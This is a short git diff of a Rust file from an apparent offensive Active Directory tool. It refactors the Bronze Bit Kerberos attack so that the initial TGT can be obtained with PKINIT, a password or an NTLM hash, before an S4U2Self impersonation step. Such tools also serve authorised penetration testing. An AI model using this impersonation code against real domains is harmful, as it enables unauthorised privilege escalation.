@@ -13,7 +13,7 @@
 
 use chrono::{Duration, Utc};
 use kerberos_asn1::Asn1Object;
-use overthrone_core::error::{OverthroneError, Result};
+use overthrone_core::error::Result;
 use overthrone_core::proto::kerberos::{self};
 use tracing::info;
 
@@ -33,24 +33,11 @@ pub async fn run_bronze_bit(config: &ForgeConfig, target_spn: &str) -> Result<Fo
         target_spn
     );
 
-    let password = config.password.as_deref().ok_or_else(|| {
-        OverthroneError::TicketForge(
-            "Password is required for Bronze Bit (to request initial TGT)".into(),
-        )
-    })?;
-
     let impersonate = config.effective_impersonate();
 
-    // Step 1: Request a legitimate TGT
+    // Step 1: Request a legitimate TGT (via PKINIT, password, or NTLM hash)
     info!("[bronzebit] Step 1: Requesting TGT as {}", config.username);
-    let user_tgt = kerberos::request_tgt(
-        &config.dc_ip,
-        &config.domain,
-        &config.username,
-        password,
-        false,
-    )
-    .await?;
+    let user_tgt = config.request_user_tgt().await?;
 
     // Step 2: S4U2Self for the impersonate user
     info!("[bronzebit] Step 2: S4U2Self as {impersonate}");
